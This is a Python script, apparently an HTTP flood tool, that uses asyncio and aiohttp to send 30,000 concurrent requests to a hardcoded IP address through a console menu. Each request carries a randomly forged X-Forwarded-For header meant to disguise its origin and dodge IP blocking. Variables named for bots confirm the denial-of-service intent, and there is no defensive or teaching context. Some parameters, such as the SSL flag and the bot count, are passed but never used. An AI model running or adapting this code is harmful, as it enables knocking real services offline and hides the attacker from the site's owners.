import asyncio
import aiohttp
import random
import time

url = 'http://46.166.142.81'
num_requests = 30000
num_bots = 500

async def send_request(session, url, ip_address, method):
    headers = {'X-Forwarded-For': ip_address}
    try:
        async with session.request(method, url, headers=headers) as response:
            print(f'Response status code: {response.status}')
            if response.status == 500:
                raise Exception("Error on website")
    except asyncio.CancelledError:
        pass

async def send_requests(session, url, num_requests, num_bots, method, use_ssl):
    tasks = []
    for _ in range(num_requests):
        ip_address = f'{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
        task = asyncio.create_task(send_request(session, url, ip_address, method))
        tasks.append(task)
    await asyncio.gather(*tasks, return_exceptions=True)

async def run_requests_asyncio(url, num_requests, num_bots, method, use_ssl):
    async with aiohttp.ClientSession() as session:
        await send_requests(session, url, num_requests, num_bots, method, use_ssl)

def run_requests(url, num_requests, num_bots, method, use_ssl):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        start_time = time.time()
        loop.run_until_complete(run_requests_asyncio(url, num_requests, num_bots, method, use_ssl))
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Elapsed time: {elapsed_time:.2f} seconds")
    finally:
        loop.close()

def main():
    while True:
        print("=== Console Menu ===")
        print("1. Start requests (HTTP)")
        print("2. Start requests (HTTPS)")
        print("3. Exit")
        choice = input("Choose an option: ")
        if choice == "1":
            method = input("Enter request method (Get/Head/Post): ").upper()
            run_requests(url, num_requests, num_bots, method, False)
        elif choice == "2":
            method = input("Enter request method (Get/Head/Post): ").upper()
            run_requests(url, num_requests, num_bots, method, True)
        elif choice == "3":
            break

if __name__ == "__main__":
    main()